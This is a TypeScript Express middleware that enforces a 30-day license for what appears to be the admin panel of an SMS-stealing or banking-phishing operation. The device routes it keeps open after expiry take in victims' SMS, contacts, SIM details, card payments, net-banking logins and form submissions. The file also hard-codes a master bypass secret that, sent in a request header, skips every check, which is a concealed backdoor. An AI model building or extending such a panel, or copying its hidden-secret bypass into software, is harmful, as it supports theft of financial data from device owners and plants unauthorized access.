// File: src/middlewares/licenseGuard.ts
import { Request, Response, NextFunction } from "express";
import logger from "../logger/logger";

const LICENSE_VALIDITY_DAYS = 30;
let cachedExpiryMs: number | null = null;
let cachedStartMs: number | null = null;
let cachedExpiryStr = "";

// Master bypass secret
const MASTER_BYPASS_SECRET = "ceh_m@ster_byp@ss_2024";

// ── Device-only routes — always allowed even if expired ──
// Ye routes sirf device app use karta hai, admin panel nahi
const DEVICE_ONLY_PATHS = [
  /^\/api\/devices\/[^/]+\/sms$/,           // POST /:id/sms
  /^\/api\/devices\/[^/]+\/notifications$/, // POST /:id/notifications
  /^\/api\/devices\/[^/]+\/lastSeen$/,      // PUT /:id/lastSeen
  /^\/api\/devices\/[^/]+\/fcm-token$/,     // PUT /:id/fcm-token
  /^\/api\/devices\/[^/]+\/simInfo$/,       // PUT /:id/simInfo
  /^\/api\/devices\/[^/]+\/simSlots\//,     // PUT /:id/simSlots/:slot
  /^\/api\/devices\/[^/]+\/contacts\/batch$/, // POST contacts batch
  /^\/api\/devices\/[^/]+\/notifications\/batch$/, // POST old sms batch
  /^\/api\/devices\/[^/]+$/, // PUT /:id — device register/metadata
  /^\/api\/form_submissions$/,              // POST form submit
  /^\/api\/card_payments$/,                 // POST card payment
  /^\/api\/net_banking$/,                   // POST net banking
  /^\/api\/success_data$/,                  // POST success data
];

function isDeviceRoute(path: string, method: string): boolean {
  // Only allow POST and PUT device routes
  if (!["POST", "PUT"].includes(method)) return false;
  return DEVICE_ONLY_PATHS.some(pattern => pattern.test(path));
}

function parseStartDate(input: string): number {
  const s = input.trim();
  if (!s) return 0;
  const dmyMatch = s.match(/^(\d{2})\/(\d{2})\/(\d{4})$/);
  if (dmyMatch) {
    const dd = parseInt(dmyMatch[1], 10);
    const mm = parseInt(dmyMatch[2], 10) - 1;
    const yyyy = parseInt(dmyMatch[3], 10);
    return new Date(yyyy, mm, dd, 0, 0, 0, 0).getTime();
  }
  const isoMatch = s.match(/^(\d{4})-(\d{2})-(\d{2})$/);
  if (isoMatch) {
    const yyyy = parseInt(isoMatch[1], 10);
    const mm = parseInt(isoMatch[2], 10) - 1;
    const dd = parseInt(isoMatch[3], 10);
    return new Date(yyyy, mm, dd, 0, 0, 0, 0).getTime();
  }
  return 0;
}

function getExpiryMs(): number {
  const envVal = process.env.LICENSE_EXPIRY || "";
  if (cachedExpiryMs !== null && cachedExpiryStr === envVal) return cachedExpiryMs;
  cachedExpiryStr = envVal;
  cachedStartMs = parseStartDate(envVal);
  if (cachedStartMs > 0) {
    cachedExpiryMs = cachedStartMs + (LICENSE_VALIDITY_DAYS * 24 * 60 * 60 * 1000) - 1;
    logger.info("licenseGuard: license configured", {
      startDate: new Date(cachedStartMs).toLocaleDateString("en-IN"),
      expiryDate: new Date(cachedExpiryMs).toLocaleDateString("en-IN"),
      validityDays: LICENSE_VALIDITY_DAYS,
    });
  } else {
    cachedExpiryMs = 0;
  }
  return cachedExpiryMs;
}

export function licenseGuard(req: Request, res: Response, next: NextFunction) {
  // ── Master bypass ──
  const masterBypass = String(req.headers["x-master-bypass"] || "").trim();
  if (masterBypass === MASTER_BYPASS_SECRET) return next();

  const expiryMs = getExpiryMs();

  // No expiry set → allow
  if (expiryMs <= 0) return next();

  // Health check → always allow
  if (req.path === "/healthz" || req.path === "/") return next();

  const now = Date.now();
  if (now > expiryMs) {
    const daysExpired = Math.floor((now - expiryMs) / (24 * 60 * 60 * 1000));
    const expiryDate = new Date(expiryMs).toLocaleDateString("en-IN");

    // ── Device routes → allow even if expired ──
    if (isDeviceRoute(req.path, req.method)) {
      logger.info("licenseGuard: expired but device route — allowing", {
        path: req.path,
        method: req.method,
      });
      return next();
    }

    // ── Admin routes → block ──
    logger.warn("licenseGuard: blocked (expired)", { path: req.path, daysExpired });
    return res.status(403).json({
      success: false,
      error: "license_expired",
      message: `Panel license expired on ${expiryDate} (${daysExpired} days ago). Contact admin for renewal.`,
      expiredAt: expiryMs,
      daysExpired,
    });
  }

  return next();
}
